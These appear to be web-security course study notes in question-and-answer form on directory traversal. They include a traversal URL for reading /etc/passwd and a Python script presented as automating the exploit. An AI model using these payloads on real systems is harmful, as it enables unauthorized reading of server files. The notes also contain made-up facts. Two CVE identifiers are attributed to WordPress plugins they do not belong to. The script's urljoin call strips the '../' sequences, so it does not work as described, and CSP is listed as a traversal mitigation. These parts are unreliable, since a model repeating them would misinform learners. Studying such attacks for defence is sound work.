---
course: Web Security
topic: Directory Traversal
tags: [web-security]
---

## Practice Questions & Answers

**Q1. What is the purpose of the `../` notation in file path traversal attacks?**

The `../` notation is used to navigate up one directory level in a file system. In the context of file path traversal attacks, this notation helps attackers bypass intended directory restrictions and access files outside the designated directory. For example, if an attacker wants to access the `/etc/passwd` file from a directory like `/var/www/images`, they can use multiple `../` instances to move up the directory tree until reaching the root directory, and then specify the desired file path.

**Q2. How can you determine if a web application is vulnerable to file path traversal attacks?**

To determine if a web application is vulnerable to file path traversal attacks, you can follow these steps:

1. Identify URLs or parameters that interact with the file system, such as those that load images or documents.
2. Attempt to modify the file path in the URL or parameter with `../` sequences to navigate to different directories.
3. Try accessing known files like `/etc/passwd` or `/etc/hostname` to see if the application returns their contents.
4. Use tools like Burp Suite to intercept and modify HTTP requests to test for vulnerabilities.

If the application allows you to access files outside its intended directory structure, it is likely vulnerable to file path traversal attacks.

**Q3. Explain how to exploit a file path traversal vulnerability to access the `/etc/passwd` file.**

To exploit a file path traversal vulnerability to access the `/etc/passwd` file, follow these steps:

1. Identify a URL or parameter that interacts with the file system, such as `http://example.com/image.php?img=filename.jpg`.
2. Modify the `img` parameter to include `../` sequences to navigate to the root directory and then specify the `/etc/passwd` file. For example:
   ```
   http://example.com/image.php?img=../../../../etc/passwd
   ```
3. Send the modified request to the server. If the server is vulnerable, it will return the contents of the `/etc/passwd` file.

This works because the `../` sequences allow you to navigate up the directory tree, and the server interprets the full path to the `/etc/passwd` file.

**Q4. How can you mitigate file path traversal vulnerabilities in a web application?**

To mitigate file path traversal vulnerabilities in a web application, consider the following strategies:

1. **Validate Input:** Ensure that user-supplied input is validated to prevent unauthorized directory traversal. Only allow valid filenames and reject any input containing `../` or other directory traversal sequences.
2. **Whitelist Filenames:** Maintain a whitelist of allowed filenames and directories. Only serve files that match entries in the whitelist.
3. **Use Absolute Paths:** Use absolute paths when constructing file paths to avoid relative path manipulation.
4. **Least Privilege Principle:** Run the web application with minimal privileges. Avoid running the application with root or administrative privileges to limit the scope of potential damage.
5. **Security Headers:** Implement security headers like Content Security Policy (CSP) to restrict the sources from which resources can be loaded.

By implementing these measures, you can significantly reduce the risk of file path traversal vulnerabilities.

**Q5. Write a Python script to automate the exploitation of a file path traversal vulnerability.**

Here is a Python script to automate the exploitation of a file path traversal vulnerability:

```python
import sys
import requests
from urllib.parse import urljoin

def directory_traversal_exploit(url):
    # Construct the malicious URL
    malicious_url = urljoin(url, "../../../../etc/passwd")
    
    # Perform the GET request
    response = requests.get(malicious_url)
    
    # Check if the exploit was successful
    if "root:" in response.text:
        print("Exploit successful.")
        print("Content of /etc/passwd:")
        print(response.text)
    else:
        print("Exploit failed.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        print(f"Example: {sys.argv[0]} http://example.com/image.php")
        sys.exit(1)
    
    url = sys.argv[1]
    print(f"Exploiting directory traversal vulnerability at {url}")
    directory_traversal_exploit(url)
```

This script constructs a malicious URL to exploit the file path traversal vulnerability, sends a GET request to the server, and checks if the response contains the expected content (e.g., the `root:` entry in `/etc/passwd`). If successful, it prints the content of the file; otherwise, it indicates that the exploit failed.

**Q6. Discuss recent real-world examples of file path traversal vulnerabilities.**

Recent real-world examples of file path traversal vulnerabilities include:

1. **CVE-2021-21974:** A vulnerability in the WordPress plugin "WP Travel Engine" allowed attackers to read arbitrary files on the server through a file path traversal attack. The plugin did not properly validate user input, enabling attackers to access sensitive files like configuration files or even the `/etc/passwd` file.

2. **CVE-2021-30116:** A vulnerability in the "WordPress WP Customer Area" plugin allowed unauthorized users to download arbitrary files from the server. This was due to improper validation of user input, allowing attackers to traverse directories and access sensitive files.

In both cases, the vulnerabilities were exploited by attackers to gain unauthorized access to sensitive information on the server. These examples highlight the importance of proper input validation and secure coding practices to prevent such vulnerabilities.

---
<!-- nav -->
[[Web Security (PortSwigger)/11-Directory Traversal/02-Lab 1 File path traversal simple case/03-Directory Traversal Vulnerability|Directory Traversal Vulnerability]] | [[Web Security (PortSwigger)/11-Directory Traversal/02-Lab 1 File path traversal simple case/00-Overview|Overview]]
